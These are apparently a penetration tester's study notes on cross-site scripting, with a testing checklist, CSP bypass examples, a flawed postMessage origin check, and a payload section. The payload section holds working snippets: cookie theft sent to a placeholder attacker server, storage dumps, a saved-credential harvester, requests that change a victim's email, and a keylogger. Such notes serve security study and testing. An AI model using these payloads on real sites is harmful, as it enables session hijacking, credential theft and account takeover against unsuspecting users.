## Checklist

- [ ] Enter unique string in every input field - check where it's being reflected in the DOM
- [ ] Check input in GET and POST requests
- [ ] Be sure to check the context in which it's reflected
    - input
    - textarea
    - JS
    - HTML attribute
    - title
    - style
    - etc.
- [ ] It may be reflected somewhere that isn't visible on the screen
- [ ] Try to escape the context where input is reflected
    - Example: `?color=%23FFFFFe;}</style><script>alert(1)</script>`
    - Injecting into JavaScript context example: `;alert(1);//`
    - If this doesn't work, try adding another attribute to the tag where input is reflected.
- [ ] Check for filter evasion
    - Case sensitivity
    - Filtered non-recursively
    - Try different encodings
    - Try leaving off closing bracket
- [ ] Check content-type

> [!tip] This is particularly important for API endpoints
> 
> If the content type doesn't match what is actually returned (e.g., text/html with JSON returned from an API), try accessing the endpoint directly and see if HTML injection is possible.

- [ ] Check for XSS in any markdown input fields
    - Links are good for this
    - Try different encodings, casing, etc.
    - Try smuggling special characters in...adding new attributes, etc.
- [ ] Look for areas where input is being stored and served to all users
- [ ] Check for blind XSS
    - Something that fires on a backend application
        - Customer service page
        - Shipping page
        - Admin dashboard
    - What are backend users likely to see?
        - Service ticket
        - Reporting a post or user
        - etc.

## Content Security Policy

CSP is a secondary protection mechanism that helps protect against XSS, Clickjacking, and other types of attacks.

### CSP Bypasses

[CSP Bypass Search](https://cspbypass.com/)
[CSP Evaluator](https://csp-evaluator.withgoogle.com/)

### CSP URI Scheme Bypass

May be able to use something like data.

Example:

```html
<script src=data:text/javascript,alert(1)></script>
```

```html
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### CSP JSONP Bypass

JSON with padding.

Allows an application to retrieve JSON data from another domain.

We can abuse the callback function. Example:

```html
<script src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=mCn54oGQH0w&callback=alert(1)></script>
```

### CSP Upload Bypass

If we can find a way to upload a script to the same domain, then it will bypass a `script-src: self` directive.

Check if `.js` files are allowed on any upload form.

Example:

```html
Test message<script src=https://z2c8lw3i.eu4.ctfio.com/csp-upload/uploads/ac27121ae671cfeb22e3eb472e0e1997.js></script>
```

## PostMessage

[postmessage](../postmessage/postmessage.md)

A way for different browser windows to be able to talk to each other.
- [ ] Check that postmessage orgin is validated
- [ ] Check for misconfigured regex

Example:

```html
<script>
	window.addEventListener("message",function(event){
		if (event.data.hasOwnProperty('msg')) {
			if( /(http:|https:)\\\\/\\\\/([a-z0-9.]{1,}).ctfio.com/.test( event.origin ) ) {
				document.getElementById('message').innerHTML = event.data.msg;
			}else{
				alert("You're not allowed to send from here!");
			}
		}
	});
</script>
```

Note the mistake in the regex. The `.` character matches any character except for line separators. This allows us to register a domain like [eviltestctfio.com](http://eviltestctfio.com/) that would bypass this check.

[regex101](https://regex101.com/)

![](attachments/xss/file-20260206135416524.png)


Additionally, there's nothing to indicate that the `ctfio.com` is the end of the string, so something like `test.ctfio.com.hacker.com` would also work.

## Payloads

### Building Requests

```jsx
let xhr = new XMLHttpRequest()
xhr.open('GET','<http://localhost/endpoint>',true)
xhr.send('email=update@email.com’)
```

```jsx
fetch('<http://localhost/endpoint’>)
```

### Stealing Cookies

```jsx
<img src="<http://localhost?c='+document.cookie+'>" />
```

```jsx
fetch(`//__ATTACKER_SERVER__/?data=${btoa(document.cookie)}`)
```

### Accessing Local & Session Storage

```jsx
let localStorageData = JSON.stringify(localStorage);
```

```jsx
let sessionStorageData = JSON.stringify(sessionStorage);
```

### Saved Credentials

```jsx
// create the input elements

let usernameField = document.createElement("input");
usernameField.type = "text";
usernameField.name = "username";
usernameField.id = "username";
let passwordField = document.createElement("input");
passwordField.type = "password";
passwordField.name = "password";
passwordField.id = "password";

// append the elements to the body of the page
document.body.appendChild(usernameField);
document.body.appendChild(passwordField);

// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)
setTimeout(function () {
  console.log("Username:", document.getElementById("username").value);
  console.log("Password:", document.getElementById("password").value);
}, 1000);
```

### Session Riding

```jsx
let xhr = new XMLHttpRequest();
xhr.open('POST','<http://localhost/updateprofile>',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('email=updated@email.com’);
```

### Keylogging

```jsx
document.onkeypress = function (e) {
  get = window.event ? event : e;
  key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  console.log(key);
};
```